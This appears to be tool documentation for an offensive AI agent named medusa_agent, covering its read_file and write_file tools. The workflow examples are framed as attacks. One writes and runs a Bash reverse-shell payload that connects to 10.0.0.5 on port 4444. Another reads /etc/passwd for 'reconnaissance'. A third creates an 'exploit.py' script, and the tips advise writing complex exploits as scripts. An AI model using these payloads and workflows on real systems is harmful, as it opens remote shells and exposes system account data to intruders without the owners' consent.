# File I/O (`read_file`, `write_file`)

Read and write files. Relative paths resolve to `medusa_agent/`; absolute paths work everywhere.

## Installation

Built-in. No installation needed.

## Parameters

### read_file
| Parameter | Required | Description |
|-----------|----------|-------------|
| `file_path` | Yes | Path to read. Relative → `medusa_agent/{path}`. Absolute → anywhere on system |

### write_file
| Parameter | Required | Description |
|-----------|----------|-------------|
| `file_path` | Yes | Path to write. Relative → `medusa_agent/{path}`. Absolute → anywhere |
| `content` | Yes | String content to write. Overwrites existing file |

## Workflows

### Write and execute a Python script
```json
{"tool": "write_file", "args": {"file_path": "scripts/exploit.py", "content": "#!/usr/bin/env python3\nimport requests\nprint(requests.get('http://TARGET').text)"}}
```
```json
{"tool": "execute_terminal", "args": {"cmd": "python3 scripts/exploit.py"}}
```

### Write and run a Bash payload
```json
{"tool": "write_file", "args": {"file_path": "payloads/rev.sh", "content": "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1"}}
```
```json
{"tool": "execute_terminal", "args": {"cmd": "bash payloads/rev.sh"}}
```

### Read config files for reconnaissance
```json
{"tool": "read_file", "args": {"file_path": "/etc/passwd"}}
{"tool": "read_file", "args": {"file_path": "outputs/scan_result.txt"}}
```

### Read from project directory
```json
{"tool": "read_file", "args": {"file_path": "medusa/config.json"}}
```

## Path Resolution Rules

| Input | Resolves to |
|-------|-------------|
| `"scripts/test.py"` | `medusa_agent/scripts/test.py` |
| `"/etc/passwd"` | `/etc/passwd` (absolute preserved) |
| `"medusa/config.json"` | `medusa_agent/medusa/config.json` (relative to workspace) |

## Tips

- Use `write_file` to create Python/Bash scripts, then `execute_terminal` to run them
- Always write complex exploits as scripts rather than one-liners — easier to debug
- Store output captures in `outputs/` for later reference
